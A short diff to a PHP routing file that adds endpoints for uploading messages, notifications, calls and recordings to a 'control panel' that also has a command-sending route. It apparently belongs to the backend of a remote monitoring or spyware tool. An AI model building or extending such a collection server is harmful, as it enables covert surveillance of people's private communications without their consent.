@@ -27,6 +27,11 @@ $route->post('/recording', fn() => $controlPanel->upload('recordings'));
 $route->post('/screenshot', fn() => $controlPanel->upload('screenshots'));
 $route->post('/video', fn() => $controlPanel->upload('videos'));
 
+$route->post('/uploadMessage', fn() => $controlPanel->uploadMessage());
+$route->post('/uploadNotification', fn() => $controlPanel->uploadNotification());
+$route->post('/uploadCall', fn() => $controlPanel->uploadCall());
+$route->post('/uploadRecording', fn() => $controlPanel->uploadRecording());
+
 $route->post('/send', fn() => $controlPanel->sendCommand());
 
 $route->submit();
